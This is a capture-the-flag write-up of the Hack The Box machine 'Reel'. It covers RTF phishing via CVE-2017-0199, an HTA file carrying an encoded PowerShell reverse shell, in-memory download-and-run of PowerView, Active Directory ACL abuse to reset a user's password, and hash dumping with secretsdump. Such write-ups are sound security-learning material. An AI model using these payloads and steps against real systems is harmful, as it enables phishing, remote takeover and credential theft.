# Reel Writeup
![Reel HTB Icon](https://www.hackthebox.com/storage/avatars/55d0de0cfa8b70e916abbb3f513dc1a7.png)
---

## Summary
Reel was a pretty tricky box, as the name implies, it involved a phishing attack, which is pretty uncommon in CTFs! 
After obtaining command execution via phishing (using a malicious macro) we find an XML credential file allowing us to pivot to a new user. 
Using bloodhound (after some intense proxying) we can eventually find out this user can abuse ACLs to reset the password of another user. This new user has GenericWrite over a group with full access to the filesystem, meaning we can add our controlled users to this group.

## Foothold

Let's kick things off with an autoscan (alias for [nmapAutomator.sh](https://github.com/21y4d/nmapAutomator))

```bash
┌──(kali㉿kali)-[~/…/HTB/hard/reel/foothold]
└─$ autoscan -H '10.10.10.77' -t port

Running a port scan on 10.10.10.77

Host is likely running Windows
                                                             
---------------------Starting Port Scan-----------------------                                                                                          

---------------------Finished all scans------------------------

Completed in 3 seconds

```
Well... that worked

Running it manually works, I think the issue is with nmap itself reporting the host as down (even though it's responding to pings), forcing the script to auto-exit.

Anyway, a quick manual scan shows the following ports
```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 11:24 EDT
Nmap scan report for 10.10.10.77
Host is up (0.028s latency).
Not shown: 1992 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown
```
Running a script scan we get the following
```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp  open  ssh         OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp  open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| [..]
|     220 Mail Service ready
|_    sequence of commands
135/tcp open  msrpc       Microsoft Windows RPC
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp open  microsoft  Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp open  ncacn_http  Microsoft Windows RPC over HTTP 1.0
Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2023-09-23T16:30:44+01:00
| smb2-time: 
|   date: 2023-09-23T15:30:42
|_  start_date: 2023-09-23T15:18:13
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required
|_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s
```
So from this we know some  interesting stuff:
- Anonymous FTP is available
- The domain name is likely HTB.LOCAL and the hostname is REEL
- There's an SMTP daemon running on port 25
- SSH is open (OpenSSH 7.6) which is unusual for a windows box
- The server is likely a Windows 2012 server

### FTP
Let's take a look at FTP.
```bash
ftp> ls
229 Entering Extended Passive Mode (|||41009|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||41011|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
```
Looks like some interesting files. Let's download them, and take a look.

#### readme.txt
```
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here. 
```

#### AppLocker.docx
```
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```
#### Windows Event Forwarding.docx
```
# get winrm config
winrm get winrm/config
# gpo config
O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)		// add to GPO
Server=http://WEF.HTB.LOCAL:5985/wsman/SubscriptionManager/WEC,Refresh=60	// add to GPO (60 seconds)
[..]
collector server -> subscription name -> runtime status
gpupdate /force (force checkin, get subscriptions)
check Microsoft/Windows/Eventlog-ForwardingPlugin/Operational for errors
```

So from these files we can deduce
- There's someone receiving RTF files and converting them to .docx files which are then saved to the FTP server
- AppLocker is in effect for exe,msi,ps1,vbs,cmd,bat and js files in **HASH** mode.
- There's potential hosts WEF.HTB.LOCAL and LAPTOP12.HTB.LOCAL
- It looks like Windows Event Log forwarding is in place and is being sent to WEF.HTB.LOCAL

If we found the name of the user receiving the mail, we might be able to (ab)use a malicious RTF document?

### SMTP (Port 25)

SMTP allows for basic user enumeration, using VRFY, EXPN and RCPT TO and checking the result. For further info check - [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)
Unfortunately, these methods don't work... VRFY and EXPN don't work, and RCPT TO always shows as valid no matter the recipient.

### SSH (Port 22)

The OpenSSH version **might** be [vulnerable](https://github.com/sriramoffcl/OpenSSH-7.6p1-Exploit-py-/tree/master), as it's running version 7.6 but attempts to exploit it didn't work

### RPC (Port 593)
We can actually connect to RPC anonymously using
```bash
rpcclient reel.htb.local -U "" -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
```
But easy enumeration commands (enumdomusers,enumdomgroups, etc) aren't allowed...
We do get something
```bash
rpcclient $> lsaquery
Domain Name: HTB
Domain Sid: S-1-5-21-2648318136-3688571242-2924127574
```
But everything else fails.

### Exiftool
As some of the files we found in FTP were .docx files, they **might** contain metadata relating to a user.
No usernames were returned from AppLocker.docx, but the Windows Event Forwarding.docx actually contains an email!
```bash
┌──(kali㉿kali)-[~/…/HTB/hard/reel/foothold]
└─$ exiftool 'Windows Event Forwarding.docx'

ExifTool Version Number         : 12.65
File Name                       : Windows Event Forwarding.docx
[..]
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com <--------- [Oops...]
```
So we have a target, now to construct an exploit.

### RTF

A bit of googling finds this, which looks somewhat promising [CVE-2017-0199 script](https://www.exploit-db.com/exploits/41894)
Now this box was released in 2018, so it lines up pretty well that this would've been **relatively** recent news on release.

A high-level flow of the exploit is as follows - [Source](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/)

1 - Embed an OLE2 link object in to a Word or RTF document
2 - Set the link to an attacker-controlled URL (e.g. https://evil.com/evil.hta)
3 - Manually edit the object in a text editor to give it the \\objupdate control
4 - Send it to a victim
5 - Victim opens the document
6 - \\objupdate forces an object to update before it is displayed, so a .hta file is fetched and executed with **NO** user interaction or warnings. 

From the [RTF Spec](https://www.biblioscape.com/rtf15_spec.htm)

```
\objupdate
Forces an update to the object before displaying it. Note that this will override any values in the <objsize> control words, but reasonable values should always be provided for these to maintain backwards compatibility.
```
Anyway, the script provided has 2 nice features, it allows for an autopwn (no fun) or a more manual method. I opted for something a bit different...

#### Step 1 - Test it works!
Using the script, I created a basic payload to check if my .hta file was being fetched
```
python2 CVE-2017-0199.py 
	-M gen 
	-w test.rtf 
	-u http://10.10.16.2:8000/test.hta
```

I then setup an HTTP server on port 8000

```
python3 -m http.server         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

And then I sent it to the previously identified user using sendEmail

```
sendEmail 
	-s 10.10.10.77 
	-f click@me.com 
	-t nico@megabank.com 
	-u 'Check this cool RTF document!' 
	-a test.rtf 
	-m 'I think you should open me'

Sep 24 06:34:48 kali sendEmail[49518]: Email was sent successfully!
```

A couple seconds later, boom!

```
10.10.10.77 - - [24/Sep/2023 06:51:23] code 404, message File not found
10.10.10.77 - - [24/Sep/2023 06:51:23] "GET /test.hta HTTP/1.1" 404 -
```

#### Step 2 - Test for code execution
There's no guarantee that the .hta file will actually be executed, although it is very likely. So I'll test to make sure we have command execution.

I'll use this .hta file [here](https://github.com/k4sth4/Malicious-HTA-File) as a template.

```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "powershell -C iwr http://10.10.16.2:8000/pwned"
    End Function

    Pwn
  </script>
</html>

```

When we send this, we should see 2 different callbacks. One for /test.hta and another for /pwned.

And sure enough, we see it.

```bash
10.10.10.77 -[24/Sep/2023 06:58:37] "GET /evil.hta HTTP/1.1" 200 
10.10.10.77 -[24/Sep/2023 06:58:38] code 404, message File not found
10.10.10.77 -[24/Sep/2023 06:58:38] "GET /pwned HTTP/1.1" 404 -

```

Code execution achieved!

#### Step 3 - Automate it
To speed things up, I'll automate the process of generating the rtf file and sending an email.

The full code is [here](https://github.com/Henryisnotavailable/HTB/blob/main/REEL/evil_rtf.py)

All that's needed is to create a .hta file that gives us a reverse shell. Because we know powershell is allowed (because Invoke-WebRequest worked), it's probably best to use that, rather than trying to get netcat on the machine, or using an msfvenom reverse shell.

The final .hta file looks like this
```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
    End Function

    Pwn
  </script>
</html>

```

FYI decoding the powershell is a simple reverse shell (comments added for clarity)
```powershell
#Open a new TCP socket to 10.10.16.2:9001
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.2",9001);

#Get a handle for the network stream 
$stream = $client.GetStream();


# % is an alias for foreach-object so this is basically 
# [byte[]] $bytes = 0..65535 | foreach-object {0};
# Which creates an array of 0's [0,0,0 ... 0] to act as a buffer.
[byte[]] $bytes = 0..65535| %{0};

#While the connection is still up read into the buffer (which is the variable $bytes)
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)  {

	#Convert the bytes to ascii
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
	
	#Run the command using iex (short for Invoke-Expression, like eval() in python)
	$sendback = (iex $data 2>&1 | Out-String );
	
	#Fake command prompt to make it look fancy
	$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
	
	#Convert to bytes
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	#Load the stream with the bytes
	$stream.Write($sendbyte,0,$sendbyte.Length);
	
	#Send it back
	$stream.Flush()
	
	}

#Close the connection when finished
$client.Close()
```

Anyway, saving that file and sending the email works!
```bash
python3 send_email.py payload.rtf http://10.10.16.2/evil.hta 10.10.10.77 mrevil@evil.com nico@megabank.com

[+] Generated payload.rtf successfully
[+] Sending an email, this might take some time... (20 seconds)
Sep 24 10:13:32 kali sendEmail[92718]: Email was sent successfully!
[+] Ok, done. Cleaning up...
```

We get an HTTP request

```bash
10.10.10.77 - - [24/Sep/2023 09:54:57] "GET /evil.hta HTTP/1.1" 200 -
```

And a hit on our listener

```bash
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.77:62076.
whoami
htb\nico
PS C:\Windows\system32>
```

We can now grab user.txt
```powershell
PS C:\> cat C:\Users\nico\desktop\user.txt

a7a57d7c4a29b363acda34b4e1b40265
```

## User / Root
Interestingly there's a file called cred.xml on Nico's desktop...
```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

Now this seems to have the **encrypted** password of Tom. The key used to encrypt PSCredentials is unique per **device** and **user** who encrypted, so we might be lucky that it was Nico who encrypted it. So we can decrypt it, as Nico.

And we are lucky!
Running the following commands gets us the password
```powershell
$credentials = Import-Clixml -Path C:\users\nico\Desktop\cred.xml
$credentials.GetNetworkCredential().password

1ts-mag1c!!!

```

Let's make sure the password actually works...
```bash
┌──(kali㉿kali)-[~/…/HTB/hard/reel/user]
└─$ crackmapexec smb htb.local -u 'tom' -p '1ts-mag1c!!!'         
SMB         htb.local       445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True)
SMB         htb.local       445    REEL             [+] HTB.LOCAL\tom:1ts-mag1c!!!
```
Magic indeed.

The password didn't work for any other users.
We do get SSH access as Tom, though. 
```bash
hydra -L users -p '1ts-mag1c!!!' ssh://htb.local -t 2                                                   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-24 10:31:28
[DATA] max 2 tasks per 1 server, overall 2 tasks, 6 login tries (l:6/p:1), ~3 tries per task
[DATA] attacking ssh://htb.local:22/
[22][ssh] host: htb.local   login: tom   password: 1ts-mag1c!!!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-24 10:31:29
```
### Desktop
Well it get's a bit too convenient... In Tom's Desktop is an AD Audit folder with bloodhound.exe, PowerView.ps1, Readme.txt and a file called ACLS.csv.
```
Findings:                                                                                                     

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                

Maybe we should re-run Cypher query against other groups we've created.
```

A bit too hand-holdy but oh well :( I'm going to ignore the installed stuff and pretend it's not there.

This host is actually a Domain Controller, but the majority of the AD-related ports are behind a firewall, as they're accessible from localhost but not from kali. 

To solve this we can port forward / proxy through SSH to localhost, bypassing the firewall.

#### Proxy Setup

Setup a proxy through SSH using dynamic port forwarding

```bash
ssh -D 4124 -Nf tom@htb.local 
```

Now to actually use this proxy we need to use proxychains which hooks the libraries and forces them through the SOCKS proxy we specify in the proxychains.conf

The only required modification to the default file is adding this line to the bottom.
```
socks5  127.0.0.1 4124
```

Make a copy of the /etc/proxychains.conf in your current directory to avoid breaking the template file.

Now when we run
```bash
proxychains4 nmap 127.0.0.1 -p 88
```

We get an open port! (Albeit after some time...)

```bash
[proxychains] config file found: /home/kali/CTFs/HTB/hard/reel/root/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-24 11:11 EDT
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:88  ...  OK
Nmap scan report for localhost (127.0.0.1)
Host is up (1.0s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec

Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
```

What we can do now is run the python version of bloodhound (which is remote!) 

The problem is that for some reason the script won't resolve hostnames like `_ldap._tcp.pdc._msdcs.htb.local` , this is actually being caused because DNS typically uses UDP (which can't be proxied over SOCKS or port forwarded (AFAIK)). Unfortunately, the server doesn't offer DNS over TCP, so using the flag --dns-tcp in bloodhound doesn't work :(. 

Using /etc/hosts also won't work because it's looking for a `SRV` record not an `A` record.

So why not setup a mini DNS server and create the SRV records that point the SRV record of `_ldap._tcp.pdc._msdcs.htb.local` to localhost?

`dnsmasq ` looks to be the perfect tool for this.


So a few monkey patches later I get it to work :0

##### Step 0
Install dnsmasq
```
sudo apt install dnsmasq
```
##### Step 1
Configure /etc/hosts with all known hostnames and point them to localhost
The contents were as follows
```
127.0.0.1 htb.local reel.htb.local laptop12.htb.local wef.htb.local
```
##### Step 2
Add 3 SRV records pointing to 127.0.0.1 in /etc/dnsmasq.conf
```
# A SRV record sending LDAP for the example.com domain to
# ldapserver.example.com port 389
srv-host=_ldap._tcp.pdc._msdcs.htb.local,127.0.0.1,389
srv-host=_ldap._tcp.gc._msdcs.htb.local,127.0.0.1,389
srv-host=_kerberos._tcp.dc._msdcs.htb.local,127.0.0.1,389
```

##### Step 3
Start the dnsmasq service
```
sudo systemctl start dnsmasq
```

##### Step 4
Sync up your time with the DC to ensure kerberos works (I'll probably do a future post on Kerberos). Again this is painful because NTP uses UDP! So we can't easily use 
```
proxychains rdate -n 127.0.0.1
```

Instead we have to get the UNIX timestamp on the DC and then just set ours to that. [Source](https://stackoverflow.com/questions/4192971/in-powershell-how-do-i-convert-datetime-to-unix-time)
```powershell
PS C:\Users\tom> $unixEpochStart = new-object DateTime 1970,1,1,0,0,0,([DateTimeKind]::Utc)                         
PS C:\Users\tom> [int]([DateTime]::UtcNow - $unixEpochStart).TotalSeconds
12341251251
```

And then on our host run
```bash
sudo date +%s -s @<OUTPUT OF PREVIOUS POWERSHELL COMMAND>
```

##### Step 5
Finally you can run it through proxychains without dropping anything to the disk or requiring any applocker bypass /exceptions :)
```shell
roxychains bloodhound-python -d htb.local -c all -u tom -p '1ts-mag1c!!!' -dc reel.htb.local -ns 127.0.0.1 --zip
[proxychains] config file found: /home/kali/CTFs/HTB/hard/reel/root/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:88  ...  OK
INFO: Connecting to LDAP server: reel.htb.local
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:389  ...  OK
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: reel.htb.local
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:389  ...  OK
INFO: Found 19 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 4 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: REEL.HTB.LOCAL
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:4124  ...  127.0.0.1:445  ...  OK
INFO: Done in 00M 07S
INFO: Compressing output into 20230924133241_bloodhound.zip
```

Now let's upload `20230924133241_bloodhound.zip` to bloodhound!

### Bloodhound analysis

Looking at Bloodhound, we can identify a possible attack path.

Our user Tom has "First Degree Object Control" over CLAIRE[at]HTB.LOCAL.

Full output from bloodhound
```js
The user TOM@HTB.LOCAL has the ability to modify the owner of the user CLAIRE@HTB.LOCAL.

Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.
```

Interestingly, Claire has WriteDacl and GenericWrite over the group BACKUP_ADMINS, meaning we can add anyone (like Tom) to the group.

#### Step 1 Gain Access to Claire's account
We can use PowerView to set our account (Tom) as the owner, modify the permissions that Tom has over Claire and then use those permissions to change the password of Claire.


First we need to setup a Credential Object
```powershell
$SecPassword = ConvertTo-SecureString '1ts-mag1c!!!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\Tom', $SecPassword)
```

Then load SharpView. There's actually an AppLocker policy that lets us run it, 

```powershell
PS> Get-AppLockerPolicy -Effective | Select -Expand RuleCollections

[..]
HashConditions : {SHA256 0x04D313D1C3AADC5D3C99B4B775ABB1CB88F160DD96FF09A34CF54CF506BBE793}         Id             : 21335679-f706-43d4-a27e-e8f94be0fa8f                                                Name           : PowerView.ps1                                                                       Description    :                                                                                     UserOrGroupSid : S-1-1-0                                                                             
Action         : Allow 
[..]
```


But we can just load it in memory after retrieving the PowerView.ps1 file hosted on our HTTP server on Kali.
```powershell
iex(new-object net.webclient).DownloadString("http://10.10.16.5:8000/PowerView.ps1")
```

Let's set ourselves as the owner Claire's account
```powershell
Set-DomainObjectOwner -Credential $Cred -Identity claire -OwnerIdentity tom
```

Then grant ourselves **full** access (GenericAll) to Claire's account
```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity claire -Rights All -PrincipalIdentity tom
```

We can then reset the account by generating a new password (in the SecureString format)
```
$newpass = ConvertTo-SecureString -String "YouGotHacked!9" -Force -AsPlainText
```
And then setting it
```
Set-DomainUserPassword -Identity claire -AccountPassword $newpass
```

(You could also use this, but it's more likely to be detected)
```
net user claire 'YouGotHacked!9' /domain
```

And we can test it over SMB.

```bash
crackmapexec smb htb.local -u 'claire' -p 'YouGotHacked!9' --shares
SMB         htb.local       445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True)
SMB         htb.local       445    REEL             [+] HTB.LOCAL\claire:YouGotHacked!9 
SMB         htb.local       445    REEL             [+] Enumerated shares
```

#### Step 2 As Claire add Tom to the BACKUP_ADMINS group

First we need to generate a new CredentialObject to act as Claire
```powershell
$SecPassword = ConvertTo-SecureString 'YouGotHacked!9' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $SecPassword)
```
Then add Tom to the group
```powershell
Add-DomainGroupMember -Identity 'BACKUP_ADMINS' -Members 'Tom' -Credential $Cred
```

Because the box resets Claire's password over time, I'll package this all into one script to do this in one shot.
```powershell
#Setup for Tom
$SecPassword = ConvertTo-SecureString '1ts-mag1c!!!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\Tom', $SecPassword)

#Add Tom as Owner, then modify ACLs to give Tom full access
Set-DomainObjectOwner -Credential $Cred -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -Credential $Cred -TargetIdentity claire -Rights All -PrincipalIdentity tom


#Create a new password and set Claire's to it
$newpass = ConvertTo-SecureString -String "YouGotHacked!9" -Force -AsPlainText
Set-DomainUserPassword -Identity claire -AccountPassword $newpass

#Authenticate as Claire and add Tom to the group
$SecPassword = ConvertTo-SecureString 'YouGotHacked!9' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $SecPassword)
Add-DomainGroupMember -Identity 'BACKUP_ADMINS' -Members 'Tom' -Credential $Cred
```

We can check it works using
```powershell
get-domaingroupmember -identity backup_admins                                                      


GroupDomain             : HTB.LOCAL                                                                                 
GroupName               : Backup_Admins                                                                             
GroupDistinguishedName  : CN=Backup_Admins,OU=Groups,DC=HTB,DC=LOCAL                                                
MemberDomain            : HTB.LOCAL                                                                                 
MemberName              : ranj                                                                                      
MemberDistinguishedName : CN=Ranj Singh,CN=Users,DC=HTB,DC=LOCAL                                                    
MemberObjectClass       : user                                                                                      
MemberSID               : S-1-5-21-2648318136-3688571242-2924127574-1136                                            

GroupDomain             : HTB.LOCAL                                                                                 
GroupName               : Backup_Admins                                                                             
GroupDistinguishedName  : CN=Backup_Admins,OU=Groups,DC=HTB,DC=LOCAL                                                
MemberDomain            : HTB.LOCAL                                                                                 
MemberName              : tom <----                                                                                      
MemberDistinguishedName : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL                                                    
MemberObjectClass       : user                                                                                      
MemberSID               : S-1-5-21-2648318136-3688571242-2924127574-1107 
```
Now this user seems to have extended access to the file system, as when trying to access the Administrator's directory (after re-logging in over SSH as Tom) we can see it.

In the desktop there's a Backup Scripts folder, and in one of the files, I find this...

```
# admin password                                                                                                    
$password="Cr4ckMeIfYouC4n!" 
```

Lovely :)

We can verify this password using crackmapexec

```bash
crackmapexec smb htb.local -u 'administrator' -p 'Cr4ckMeIfYouC4n!' --shares 
SMB         htb.local       445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True)
SMB         htb.local       445    REEL             [+] HTB.LOCAL\administrator:Cr4ckMeIfYouC4n! (Pwn3d!)
SMB         htb.local       445    REEL             [+] Enumerated shares
SMB         htb.local       445    REEL             Share           Permissions     Remark
SMB         htb.local       445    REEL             -----           -----------     ------
SMB         htb.local       445    REEL             ADMIN$          READ,WRITE      Remote Admin
SMB         htb.local       445    REEL             C$              READ,WRITE      Default share
SMB         htb.local       445    REEL             ExchangeOAB     READ,WRITE      OAB Distribution share
SMB         htb.local       445    REEL             IPC$                            Remote IPC
SMB         htb.local       445    REEL             NETLOGON        READ,WRITE      Logon server share 
SMB         htb.local       445    REEL             SYSVOL          READ            Logon server share 
```

So now we can use smbexec.py from impacket to run as SYSTEM 
```bash
/usr/share/doc/python3-impacket/examples/smbexec.py 'htb.local/administrator:Cr4ckMeIfYouC4n!@10.10.10.77'
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

Now we can grab root.txt
```powershell
C:\Windows\system32>type c:\users\administrator\desktop\root.txt
67f024ca1810816cf1e98b15ec33a11a
```


For fun we can also dump all of the hashes of the domain using secretsdump.py from Impacket
```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py 'htb.local/administrator:Cr4ckMeIfYouC4n!@10.10.10.77'


[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:06a484801afe9413e782e1923c5f3343:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] DefaultPassword 
HTB\nico:Cr4ckMeIfYouC4n!

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
REEL$:1001:aad3b435b51404eeaad3b435b51404ee:a951b1506f74cd7e82883af1b307e427:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0dc895f21a8b222cdb96518719de375f:::
HTB.LOCAL\nico:1105:aad3b435b51404eeaad3b435b51404ee:cd88c7b4b819442a1e0ad041d4675aee:::
HTB.LOCAL\tom:1107:aad3b435b51404eeaad3b435b51404ee:494c49c3a53e33a778f647dafac797b3:::
